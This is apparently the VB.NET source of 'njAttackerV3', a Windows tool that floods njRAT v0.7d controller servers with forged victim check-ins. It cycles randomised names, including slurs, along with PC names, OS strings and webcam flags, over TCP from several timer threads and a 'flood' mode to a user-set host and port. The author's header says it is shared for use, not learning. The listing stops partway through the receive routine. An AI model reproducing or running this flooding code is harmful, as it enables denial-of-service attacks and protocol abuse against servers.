Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports System.IO
Imports System.IO.Compression
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Environment

'*] njAttackerV3 v1.2
'*] by SEMO.Pa3x , skype: security.najaf
'*] i give you This "SRC" to let you update just the PORT. not for learning or something
'*] this client make attackes to njRAT v0.7d "Fake victimes"
'*] if you are a good programmer you can make "Multi-Hosting" option during one attack

'------------------------------------------------------------------------------------------
'*] NOTE: YOU CAN CHANGE PORT IN THIS LINE { OK.C.Connect(Form1.Host.Text, 5552) }
'------------------------------------------------------------------------------------------

'*] Last Edit: 2016/5/9


Public Class Form1

    Declare Function AnimateWindow Lib "user32" (ByVal hwnd As Integer, ByVal dwTime As Integer, ByVal dwFlags As Integer) As Boolean
    Const AW_HOR_POSITIVE = &H1 'Animates the window from left to right. This flag can be used with roll or slide animation.
    Const AW_HOR_NEGATIVE = &H2 'Animates the window from right to left. This flag can be used with roll or slide animation.
    Const AW_VER_POSITIVE = &H4 'Animates the window from top to bottom. This flag can be used with roll or slide animation.
    Const AW_VER_NEGATIVE = &H8 'Animates the window from bottom to top. This flag can be used with roll or slide animation.
    Const AW_CENTER = &H10 'Makes the window appear to collapse inward if AW_HIDE is used or expand outward if the AW_HIDE is not used.
    Const AW_HIDE = &H10000 'Hides the window. By default, the window is shown.
    Const AW_ACTIVATE = &H20000 'Activates the window.
    Const AW_SLIDE = &H40000 'Uses slide animation. By default, roll animation is used.
    Const AW_BLEND = &H80000

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Text = "njAttacker | Status: Stopped"
        Label14.Text = "njAttacker | Status: Attacking"
        RadioButton1.Enabled = False
        RadioButton2.Enabled = False

        If Button2.Enabled = False Then
            Button1.Enabled = False
            Button2.Enabled = True
        End If

        If MODEFLOOD = "0" Then
            Timer1.Start()
            Timer2.Start()
            Timer3.Start()
            Timer4.Start()
            Timer5.Stop()
        Else
            Timer1.Stop()
            Timer2.Stop()
            Timer4.Stop()
            Timer3.Stop()
            Timer5.Start()
        End If

        My.Settings.Save()

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        ProjectData.EndApp()



    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub
    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
        tt.Start()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Text = "njAttacker | Status: Stopped"
        Label14.Text = "njAttacker | Status: Stopped"

        RadioButton1.Enabled = True
        RadioButton2.Enabled = True


        If Button1.Enabled = False Then
            Button1.Enabled = True
            Button2.Enabled = False

            Timer1.Stop()
            Timer2.Stop()
            Timer3.Stop()
            Timer4.Stop()
            Timer5.Stop()


        End If
    End Sub

    Public Shared Function GTV(ByVal Name As String, ByVal df As String) As String
        Dim str As String
        Try
            str = Conversions.ToString(My.Computer.Registry.CurrentUser.OpenSubKey(("Software\njAttackerV3")).GetValue(Name, df))
        Catch exception1 As Exception
            str = df
        End Try
        Return str
    End Function

    Public Shared Sub STV(ByVal Name As String, ByVal v As String)
        Try
            My.Computer.Registry.CurrentUser.CreateSubKey(("Software\njAttackerV3")).SetValue(Name, v)
        Catch exception1 As Exception
        End Try
    End Sub

    Function RandomString(r As Random)
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim sb As New StringBuilder
        Dim cnt As Integer = r.Next(9, 9)
        For i As Integer = 1 To cnt
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

    Function RandomPC(r As Random)
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim sb As New StringBuilder
        Dim cnt As Integer = r.Next(7, 7)
        For i As Integer = 1 To cnt
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

    Public Const WM_NCLBUTTONDOWN As Integer = &HA1
    Public Const HT_CAPTION As Integer = &H2

    <DllImportAttribute("user32.dll")>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function

    <DllImportAttribute("user32.dll")>
    Public Shared Function ReleaseCapture() As Boolean
    End Function
    Private Sub Panel1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown, Panel1.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub

    Private Sub Label14_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown, Label14.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub

    Protected Overrides Sub OnPaintBackground(ByVal e As PaintEventArgs)
        MyBase.OnPaintBackground(e)

        Dim rect As New Rectangle(0, 0, Me.ClientSize.Width - 1, Me.ClientSize.Height - 1)

        e.Graphics.DrawRectangle(Pens.Black, rect)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        AnimateWindow(Me.Handle.ToInt32, 500, AW_CENTER Or AW_ACTIVATE)
        'Host.Text = GTV("HOST", Host.Text)
        Host.Text = My.Settings.Host
        Port.Text = My.Settings.Port
        VName.Text = My.Settings.Name
        vPC.Text = My.Settings.PC
        TextBox1.Text = My.Settings.User
        TextBox2.Text = My.Settings.vDate
        TextBox3.Text = My.Settings.OS
        TextBox4.Text = My.Settings.Cam
        TextBox5.Text = My.Settings.Ping
        TextBox6.Text = My.Settings.Ver
        TextBox7.Text = My.Settings.Splitkey
    End Sub

    Private Sub Host_TextChanged(sender As Object, e As EventArgs) Handles Host.TextChanged
        My.Settings.Host = Host.Text
        My.Settings.Save()
    End Sub

    Private Sub Port_TextChanged(sender As Object, e As EventArgs) Handles Port.TextChanged
        My.Settings.Port = Port.Text
        My.Settings.Save()
    End Sub

    Private Sub Name_TextChanged(sender As Object, e As EventArgs) Handles VName.TextChanged
        My.Settings.Name = VName.Text
        My.Settings.Save()
    End Sub

    Private Sub vPC_TextChanged(sender As Object, e As EventArgs) Handles vPC.TextChanged
        My.Settings.PC = vPC.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        My.Settings.User = TextBox1.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged
        My.Settings.vDate = TextBox2.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
        My.Settings.OS = TextBox3.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox4_TextChanged(sender As Object, e As EventArgs) Handles TextBox4.TextChanged
        My.Settings.Cam = TextBox4.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged
        My.Settings.Ping = TextBox5.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox6_TextChanged(sender As Object, e As EventArgs) Handles TextBox6.TextChanged
        My.Settings.Ver = TextBox6.Text
        My.Settings.Save()
    End Sub

    Private Sub TextBox7_TextChanged(sender As Object, e As EventArgs) Handles TextBox7.TextChanged
        My.Settings.Splitkey = TextBox7.Text
        My.Settings.Save()
    End Sub

    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        ' by making Generator static, we preserve the same instance '
        ' (i.e., do not create new instances with the same seed over and over) '
        ' between calls '
        Static Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        ''Timer3.Start()
        TextBox5.Text = GetRandom(1, 999) & "ms"

        TextBox2.Text = GetRandom(11, 99) & "-" & GetRandom(11, 99) & "-" & GetRandom(11, 99)

        TextBox4.Text = Int(GetRandom(1, 6))
        Select Case TextBox4.Text
            Case 0
                TextBox4.Text = "Yes"
            Case 1
                TextBox4.Text = "No"
            Case 2
                TextBox4.Text = "Yes"
            Case 3
                TextBox4.Text = "No"
            Case 4
                TextBox4.Text = "Yes"
            Case 5
                TextBox4.Text = "No"
        End Select

        Dim fuck As New Random
        VName.Text = Int(GetRandom(1, 21))
        Select Case VName.Text
            Case 0
                VName.Text = "HacKed_" & RandomString(fuck)
            Case 1
                VName.Text = "Bot_" & RandomString(fuck)
            Case 2
                VName.Text = "Victim_" & RandomString(fuck)
            Case 3
                VName.Text = "RAT_" & RandomString(fuck)
            Case 4
                VName.Text = "Vitima_" & RandomString(fuck)
            Case 5
                VName.Text = "HacKed_" & RandomString(fuck)
            Case 6
                VName.Text = "zombie_" & RandomString(fuck)
            Case 7
                VName.Text = "IDIOT_" & RandomString(fuck)
            Case 8
                VName.Text = "Stealer_" & RandomString(fuck)
            Case 9
                VName.Text = "Discord_" & RandomString(fuck)
            Case 10
                VName.Text = "test_" & RandomString(fuck)
            Case 11
                VName.Text = "Spread_" & RandomString(fuck)
            Case 12
                VName.Text = "YT_" & RandomString(fuck)
            Case 13
                VName.Text = "Bitch_" & RandomString(fuck)
            Case 14
                VName.Text = "retard_" & RandomString(fuck)
            Case 15
                VName.Text = "123_" & RandomString(fuck)
            Case 16
                VName.Text = "Friend_" & RandomString(fuck)
            Case 17
                VName.Text = "Github_" & RandomString(fuck)
            Case 18
                VName.Text = "TROLLING_" & RandomString(fuck)
            Case 19
                VName.Text = "nitro_" & RandomString(fuck)
            Case 20
                VName.Text = "Ratted_" & RandomString(fuck)
        End Select

        vPC.Text = Int(GetRandom(1, 21))
        Select Case vPC.Text
            Case 0
                vPC.Text = "COMPUTER-" & RandomPC(fuck)
            Case 1
                vPC.Text = "WorkPC-" & RandomPC(fuck)
            Case 2
                vPC.Text = "Desktop-" & RandomPC(fuck)
            Case 3
                vPC.Text = "LAPTOP-" & RandomPC(fuck)
            Case 4
                vPC.Text = "DELL-" & RandomPC(fuck)
            Case 5
                vPC.Text = "Lenovo-" & RandomPC(fuck)
            Case 6
                vPC.Text = "MyPC-" & RandomPC(fuck)
            Case 7
                vPC.Text = "Notebook-" & RandomPC(fuck)
            Case 8
                vPC.Text = "Home-" & RandomPC(fuck)
            Case 9
                vPC.Text = "Alienware-" & RandomPC(fuck)
            Case 10
                vPC.Text = "Dell-" & RandomPC(fuck)
            Case 11
                vPC.Text = "ASUS-" & RandomPC(fuck)
            Case 12
                vPC.Text = "Hckr-" & RandomPC(fuck)
            Case 13
                vPC.Text = "Win-" & RandomPC(fuck)
            Case 14
                vPC.Text = "MyNew-" & RandomPC(fuck)
            Case 15
                vPC.Text = "Brand-" & RandomPC(fuck)
            Case 16
                vPC.Text = "Free-" & RandomPC(fuck)
            Case 17
                vPC.Text = "SchoolPC-" & RandomPC(fuck)
            Case 18
                vPC.Text = "TechSupport-" & RandomPC(fuck)
            Case 19
                vPC.Text = "CallCenter-" & RandomPC(fuck)
            Case 20
                vPC.Text = "VM-" & RandomPC(fuck)

        End Select


        TextBox3.Text = Int(GetRandom(1, 12))
        Select Case TextBox3.Text
            Case 0
                TextBox3.Text = "Win 2012 Server SP0 x64"
            Case 1
                TextBox3.Text = "Win 7 Enterprise SP2 x86"
            Case 2
                TextBox3.Text = "Win XP SP3 Home"
            Case 3
                TextBox3.Text = "Win 11 Pro SP0 x86"
            Case 4
                TextBox3.Text = "Win 10 Pro SP0 x64"
            Case 5
                TextBox3.Text = "Win 7 Professional SP1 x86"
            Case 6
                TextBox3.Text = "Win 8 Home SP3 x64"
            Case 7
                TextBox3.Text = "Win 8.1 Enterprise SP2 x86"
            Case 8
                TextBox3.Text = "Win Vista Professional SP3 x86"
            Case 9
                TextBox3.Text = "Win Vista Home SP0 x86"
            Case 10
                TextBox3.Text = "Win 2015 Server SP2 x64"
            Case 11
                TextBox3.Text = "Win 2016 Server SP1 x64"
        End Select


        TextBox1.Text = Int(GetRandom(1, 31))
        Select Case TextBox1.Text
            Case 0
                TextBox1.Text = "Admin"
            Case 1
                TextBox1.Text = "Anonymous"
            Case 2
                TextBox1.Text = "JOHN"
            Case 3
                TextBox1.Text = "TMobile"
            Case 4
                TextBox1.Text = "myacc"
            Case 5
                TextBox1.Text = "Server"
            Case 6
                TextBox1.Text = "FrankC"
            Case 7
                TextBox1.Text = "XGamer"
            Case 8
                TextBox1.Text = "test"
            Case 9
                TextBox1.Text = "job"
            Case 10
                TextBox1.Text = "WorkAccount"
            Case 11
                TextBox1.Text = "NewPc"
            Case 12
                TextBox1.Text = "csgo"
            Case 13
                TextBox1.Text = "GAMER"
            Case 14
                TextBox1.Text = "Mohammad"
            Case 15
                TextBox1.Text = "Cinema"
            Case 16
                TextBox1.Text = "vmware"
            Case 17
                TextBox1.Text = "vbox"
            Case 18
                TextBox1.Text = "User"
            Case 19
                TextBox1.Text = "Guest"
            Case 20
                TextBox1.Text = "Raj"
            Case 21
                TextBox1.Text = "Mike"
            Case 22
                TextBox1.Text = "Joseph"
            Case 23
                TextBox1.Text = "AnonHax"
            Case 24
                TextBox1.Text = "ELIENE"
            Case 25
                TextBox1.Text = "client"
            Case 26
                TextBox1.Text = "Utilisateur"
            Case 27
                TextBox1.Text = "Henry"
            Case 28
                TextBox1.Text = "Ali"
            Case 29
                TextBox1.Text = "HP"
            Case 30
                TextBox1.Text = "Administrator"
        End Select

        If MODEFLOOD = "1" And Button2.Enabled = True Then
            Dim tt As Object = New Thread(AddressOf OK.RC, 1)
            tt.Start()
        Else
            ''lol nothing
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            Timer5.Start()
        Else
            Timer5.Stop()
        End If
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        ''Ts
        ''Timer3.Start()
        TextBox5.Text = GetRandom(1, 999) & "ms"

        TextBox2.Text = GetRandom(11, 99) & "-" & GetRandom(11, 99) & "-" & GetRandom(11, 99)

        TextBox4.Text = Int(GetRandom(1, 6))
        Select Case TextBox4.Text
            Case 0
                TextBox4.Text = "Yes"
            Case 1
                TextBox4.Text = "No"
            Case 2
                TextBox4.Text = "Yes"
            Case 3
                TextBox4.Text = "No"
            Case 4
                TextBox4.Text = "Yes"
            Case 5
                TextBox4.Text = "No"
        End Select

        Dim fuck As New Random
        VName.Text = Int(GetRandom(1, 21))
        Select Case VName.Text
            Case 0
                VName.Text = "HacKed_" & RandomString(fuck)
            Case 1
                VName.Text = "Bot_" & RandomString(fuck)
            Case 2
                VName.Text = "Victim_" & RandomString(fuck)
            Case 3
                VName.Text = "RAT_" & RandomString(fuck)
            Case 4
                VName.Text = "Vitima_" & RandomString(fuck)
            Case 5
                VName.Text = "HacKed_" & RandomString(fuck)
            Case 6
                VName.Text = "zombie_" & RandomString(fuck)
            Case 7
                VName.Text = "IDIOT_" & RandomString(fuck)
            Case 8
                VName.Text = "Stealer_" & RandomString(fuck)
            Case 9
                VName.Text = "Discord_" & RandomString(fuck)
            Case 10
                VName.Text = "test_" & RandomString(fuck)
            Case 11
                VName.Text = "Spread_" & RandomString(fuck)
            Case 12
                VName.Text = "YT_" & RandomString(fuck)
            Case 13
                VName.Text = "Bitch_" & RandomString(fuck)
            Case 14
                VName.Text = "retard_" & RandomString(fuck)
            Case 15
                VName.Text = "123_" & RandomString(fuck)
            Case 16
                VName.Text = "Friend_" & RandomString(fuck)
            Case 17
                VName.Text = "Github_" & RandomString(fuck)
            Case 18
                VName.Text = "TROLLING_" & RandomString(fuck)
            Case 19
                VName.Text = "nitro_" & RandomString(fuck)
            Case 20
                VName.Text = "Ratted_" & RandomString(fuck)
        End Select

        vPC.Text = Int(GetRandom(1, 21))
        Select Case vPC.Text
            Case 0
                vPC.Text = "COMPUTER-" & RandomPC(fuck)
            Case 1
                vPC.Text = "WorkPC-" & RandomPC(fuck)
            Case 2
                vPC.Text = "Desktop-" & RandomPC(fuck)
            Case 3
                vPC.Text = "LAPTOP-" & RandomPC(fuck)
            Case 4
                vPC.Text = "DELL-" & RandomPC(fuck)
            Case 5
                vPC.Text = "Lenovo-" & RandomPC(fuck)
            Case 6
                vPC.Text = "MyPC-" & RandomPC(fuck)
            Case 7
                vPC.Text = "Notebook-" & RandomPC(fuck)
            Case 8
                vPC.Text = "Home-" & RandomPC(fuck)
            Case 9
                vPC.Text = "Alienware-" & RandomPC(fuck)
            Case 10
                vPC.Text = "Dell-" & RandomPC(fuck)
            Case 11
                vPC.Text = "ASUS-" & RandomPC(fuck)
            Case 12
                vPC.Text = "Hckr-" & RandomPC(fuck)
            Case 13
                vPC.Text = "Win-" & RandomPC(fuck)
            Case 14
                vPC.Text = "MyNew-" & RandomPC(fuck)
            Case 15
                vPC.Text = "Brand-" & RandomPC(fuck)
            Case 16
                vPC.Text = "Free-" & RandomPC(fuck)
            Case 17
                vPC.Text = "SchoolPC-" & RandomPC(fuck)
            Case 18
                vPC.Text = "TechSupport-" & RandomPC(fuck)
            Case 19
                vPC.Text = "CallCenter-" & RandomPC(fuck)
            Case 20
                vPC.Text = "VM-" & RandomPC(fuck)

        End Select


        TextBox3.Text = Int(GetRandom(1, 12))
        Select Case TextBox3.Text
            Case 0
                TextBox3.Text = "Win 2012 Server SP0 x64"
            Case 1
                TextBox3.Text = "Win 7 Enterprise SP2 x86"
            Case 2
                TextBox3.Text = "Win XP SP3 Home"
            Case 3
                TextBox3.Text = "Win 11 Pro SP0 x86"
            Case 4
                TextBox3.Text = "Win 10 Pro SP0 x64"
            Case 5
                TextBox3.Text = "Win 7 Professional SP1 x86"
            Case 6
                TextBox3.Text = "Win 8 Home SP3 x64"
            Case 7
                TextBox3.Text = "Win 8.1 Enterprise SP2 x86"
            Case 8
                TextBox3.Text = "Win Vista Professional SP3 x86"
            Case 9
                TextBox3.Text = "Win Vista Home SP0 x86"
            Case 10
                TextBox3.Text = "Win 2015 Server SP2 x64"
            Case 11
                TextBox3.Text = "Win 2016 Server SP1 x64"
        End Select


        TextBox1.Text = Int(GetRandom(1, 31))
        Select Case TextBox1.Text
            Case 0
                TextBox1.Text = "Admin"
            Case 1
                TextBox1.Text = "Anonymous"
            Case 2
                TextBox1.Text = "JOHN"
            Case 3
                TextBox1.Text = "TMobile"
            Case 4
                TextBox1.Text = "myacc"
            Case 5
                TextBox1.Text = "Server"
            Case 6
                TextBox1.Text = "FrankC"
            Case 7
                TextBox1.Text = "XGamer"
            Case 8
                TextBox1.Text = "test"
            Case 9
                TextBox1.Text = "job"
            Case 10
                TextBox1.Text = "WorkAccount"
            Case 11
                TextBox1.Text = "NewPc"
            Case 12
                TextBox1.Text = "csgo"
            Case 13
                TextBox1.Text = "GAMER"
            Case 14
                TextBox1.Text = "Mohammad"
            Case 15
                TextBox1.Text = "Cinema"
            Case 16
                TextBox1.Text = "vmware"
            Case 17
                TextBox1.Text = "vbox"
            Case 18
                TextBox1.Text = "User"
            Case 19
                TextBox1.Text = "Guest"
            Case 20
                TextBox1.Text = "Raj"
            Case 21
                TextBox1.Text = "Mike"
            Case 22
                TextBox1.Text = "Joseph"
            Case 23
                TextBox1.Text = "AnonHax"
            Case 24
                TextBox1.Text = "ELIENE"
            Case 25
                TextBox1.Text = "client"
            Case 26
                TextBox1.Text = "Utilisateur"
            Case 27
                TextBox1.Text = "Henry"
            Case 28
                TextBox1.Text = "Ali"
            Case 29
                TextBox1.Text = "HP"
            Case 30
                TextBox1.Text = "Administrator"
        End Select


        Dim tt As Object = New Thread(AddressOf OK.RC, 1)
            tt.Start()


    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

        My.Settings.Host = Host.Text
        My.Settings.Port = Port.Text
        My.Settings.Name = VName.Text
        My.Settings.PC = vPC.Text
        My.Settings.User = TextBox1.Text
        My.Settings.OS = TextBox3.Text
        My.Settings.Cam = TextBox4.Text
        My.Settings.Ping = TextBox5.Text
        My.Settings.Ver = TextBox6.Text
        My.Settings.Splitkey = TextBox7.Text
        My.Settings.Save()
        Dim appPath As String = Application.StartupPath()

    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged
        Timer1.Interval = NumericUpDown1.Value
        Timer2.Interval = NumericUpDown1.Value
        Timer3.Interval = NumericUpDown1.Value
        Timer4.Interval = NumericUpDown1.Value
    End Sub

    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        SplashScreen.Close()

    End Sub

    Public Shared MODEFLOOD As String = "0"

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            MODEFLOOD = "1"
        Else
            MODEFLOOD = "0"
        End If
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            MODEFLOOD = "0"
        Else
            MODEFLOOD = "1"
        End If
    End Sub

    Private Sub Form1_MarginChanged(sender As Object, e As EventArgs) Handles Me.MarginChanged

    End Sub

    Private Sub GroupBox3_Enter(sender As Object, e As EventArgs) Handles GroupBox3.Enter

    End Sub

    Private Sub GroupBox2_Enter(sender As Object, e As EventArgs) Handles GroupBox2.Enter

    End Sub

    Private Sub GroupBox1_Enter(sender As Object, e As EventArgs) Handles GroupBox1.Enter

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        AnimateWindow(Me.Handle.ToInt32, 500, AW_CENTER Or AW_HIDE)
        ProjectData.EndApp()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Function testSelectedPort(ip As String, port As Integer) As Boolean
        Dim testSocket As New System.Net.Sockets.TcpClient()

        Try
            testSocket.Connect(ip, port)
            Label16.Text = "Port Status: Port open"
            ' The socket is accepting connections
            testSocket.Close()
            Return True

        Catch ex As Exception
            Label16.Text = "Port Status: Port closed"
            ' The port is not accepting connections
            Return False
        End Try

        Return False
    End Function

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Label16.Text = "Port Status: Checking port..."
        Try
            testSelectedPort(Host.Text, Port.Text)
        Catch ex As Exception
            Label16.Text = "Port Status: Invalid Port/Host..."
        End Try
    End Sub
End Class

Public Class OK

    Public Shared Function BS(ByRef B As Byte()) As String
        Return Encoding.UTF8.GetString(B)
    End Function

    Public Shared Function Cam() As Boolean
        Try
            Dim num As Integer = 0
            Do
                Dim lpszVer As String = Nothing
                If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                    Return True
                End If
                num += 1
            Loop While (num <= 4)
        Catch exception1 As Exception
        End Try
        Return False
    End Function

    <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    End Function

    Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
        If (F1.Name.ToLower = F2.Name.ToLower) Then
            Dim directory As DirectoryInfo = F1.Directory
            Dim parent As DirectoryInfo = F2.Directory
            Do
                If (directory.Name.ToLower <> parent.Name.ToLower) Then
                    Return False
                End If
                directory = directory.Parent
                parent = parent.Parent
                If ((directory Is Nothing) And (parent Is Nothing)) Then
                    Return True
                End If
                If (directory Is Nothing) Then
                    Return False
                End If
            Loop While (Not parent Is Nothing)
        End If
        Return False
    End Function
    Public Shared Function connect() As Boolean
        OK.Cn = False
        Thread.Sleep(&H7D0)
        Dim lO As FileInfo = OK.LO
        SyncLock lO
            Try
                If (Not OK.C Is Nothing) Then
                    Try
                        OK.C.Close()
                        OK.C = Nothing
                    Catch exception1 As Exception
                    End Try
                End If
                Try
                    OK.MeM.Dispose()
                Catch exception6 As Exception

                End Try
            Catch exception7 As Exception

            End Try
            Try
                OK.MeM = New MemoryStream
                OK.C = New TcpClient
                OK.C.ReceiveBufferSize = &H32000
                OK.C.SendBufferSize = &H32000
                OK.C.Client.SendTimeout = &H2710
                OK.C.Client.ReceiveTimeout = &H2710
                OK.C.Connect(My.Settings.Host, My.Settings.Port)
                OK.Cn = True
                OK.Send(OK.inf)
                Try
                    OK.Send(("inf" & OK.Y))
                Catch exception8 As Exception
                End Try
            Catch exception9 As Exception
            End Try
        End SyncLock
        Return OK.Cn
    End Function

    Public Shared Function DEB(ByRef s As String) As String
        Return OK.BS(Convert.FromBase64String(s))
    End Function


    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(OK.SB(s))
    End Function

    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function

    Public Shared Function HWD() As String
        Dim str As String
        Try
            Dim num As Integer
            Dim lpVolumeNameBuffer As String = Nothing
            Dim lpMaximumComponentLength As Integer = 0
            Dim lpFileSystemFlags As Integer = 0
            Dim lpFileSystemNameBuffer As String = Nothing
            OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
            str = Conversion.Hex(num)
        Catch exception1 As Exception
            str = "ERR"
        End Try
        Return str
    End Function

    Public Shared Function inf() As String
        Dim str2 As String = ("ll" & OK.Y)
        Try
            str2 = (str2 & OK.ENB(My.Settings.Name) & OK.Y)
        Catch exception1 As Exception
            str2 = (str2 & OK.ENB(My.Settings.Name) & OK.Y)
        End Try
        Try
            str2 = (str2 & My.Settings.PC & OK.Y)
        Catch exception9 As Exception
            str2 = (str2 & My.Settings.PC & OK.Y)
        End Try
        Try
            str2 = (str2 & My.Settings.User & OK.Y)
        Catch exception10 As Exception
            str2 = (str2 & My.Settings.User & OK.Y)
        End Try
        Try
            str2 = (str2 & My.Settings.vDate & OK.Y)
        Catch exception11 As Exception
            str2 = (str2 & My.Settings.vDate & OK.Y)
        End Try
        str2 = (str2 & "" & OK.Y)
        Try
            str2 = (str2 & My.Settings.OS)
        Catch exception12 As Exception
            str2 = (str2 & My.Settings.OS)
        End Try

        'Not sure where this is supposed to go but oops.
        str2 = (str2 & "")

        'NOTE2SELF:
        'Shit we don't want here, but I can't remove.
        Try
            Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, "", -1, CompareMethod.Binary)
            If (strArray.Length = 1) Then
                str2 = (str2 & "")
            End If
            str2 = (str2 & strArray((strArray.Length - 1)))
        Catch exception13 As Exception
            str2 = (str2 & "")
        End Try
        Try
            If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                str2 = (str2 & "" & OK.Y)
            Else
                str2 = (str2 & "" & OK.Y)
            End If
        Catch exception14 As Exception
            str2 = (str2 & OK.Y)
        End Try
        'NOTE2SELF:
        'End of shit I don't need here.

        If OK.Cam Then
            str2 = (str2 & My.Settings.Cam & OK.Y)
        Else
            str2 = (str2 & My.Settings.Cam & OK.Y)
        End If
        str2 = (((str2 & OK.VR & OK.Y) & My.Settings.Ping & OK.Y) & OK.Y)
        Return (str2)
    End Function


    Public Shared Sub RC()

        If (Not OK.C Is Nothing) Then
            Dim num As Long = -1
            Dim num2 As Integer = 0
            Try
Label_001B:
                num2 += 1
                If (num2 = 10) Then
                    num2 = 0
                    Thread.Sleep(1)
                End If
                If Not OK.Cn Then
                    GoTo Label_01C1
                End If
                If (OK.C.Available < 1) Then
                    OK.C.Client.Poll(-1, SelectMode.SelectRead)
                End If
Label_0057:
                If (OK.C.Available > 0) Then
                    If (num = -1) Then
                        Dim str As String = ""
                        Do While True
                            Dim charCode As Integer = OK.C.GetStream.ReadByte
                            Select Case charCode
                                Case -1
                                    GoTo Label_01C1
                                Case 0
                                    num = Conversions.ToLong(str)
                                    str = ""
                                    If (num = 0) Then
                                        OK.Send("")
                                        num = -1
                                    End If
                                    If (OK.C.Available <= 0) Then
